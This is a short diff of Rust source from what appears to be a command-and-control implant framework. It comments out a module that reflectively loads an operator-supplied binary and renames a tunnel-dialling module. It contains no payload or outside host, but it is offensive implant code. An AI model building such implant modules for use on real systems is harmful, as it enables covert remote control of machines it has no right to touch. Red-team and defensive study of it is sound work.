@@ -1,7 +1,6 @@
 use anyhow::anyhow;
 use async_trait::async_trait;
 use futures::SinkExt;
-#[cfg(any(feature = "rem_static", feature = "rem_reflection"))]
 use malefic_helper::common::rem;
 use malefic_helper::to_error;
 use malefic_modules::{
@@ -11,35 +10,35 @@ use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::{Block, Request, Response};
 use malefic_trait::module_impl;
 
-#[cfg(feature = "load_rem")]
-pub struct LoadRem {}
-
-#[cfg(feature = "load_rem")]
-#[async_trait]
-#[module_impl("load_rem")]
-impl Module for LoadRem {}
-
-#[cfg(feature = "load_rem")]
-#[async_trait]
-impl ModuleImpl for LoadRem {
-    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
-        let request = check_request!(receiver, Body::Request)?;
-        let bin = check_field!(request.bin)?;
-        to_error!(rem::RemReflection::load_rem(bin))?;
-
-        Ok(TaskResult::new_with_body(
-            id,
-            Body::Response(Response::default()),
-        ))
-    }
-}
+// #[cfg(feature = "load_rem")]
+// pub struct LoadRem {}
+// 
+// #[cfg(feature = "load_rem")]
+// #[async_trait]
+// #[module_impl("load_rem")]
+// impl Module for LoadRem {}
+// 
+// #[cfg(feature = "load_rem")]
+// #[async_trait]
+// impl ModuleImpl for LoadRem {
+//     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
+//         let request = check_request!(receiver, Body::Request)?;
+//         let bin = check_field!(request.bin)?;
+//         to_error!(rem::RemReflection::load_rem(bin))?;
+// 
+//         Ok(TaskResult::new_with_body(
+//             id,
+//             Body::Response(Response::default()),
+//         ))
+//     }
+// }
 
 #[cfg(feature = "rem_dial")]
 pub struct RemDial {}
 
 #[cfg(feature = "rem_dial")]
 #[async_trait]
-#[module_impl("rem")]
+#[module_impl("rem_dial")]
 impl Module for RemDial {}
 
 #[cfg(feature = "rem_dial")]
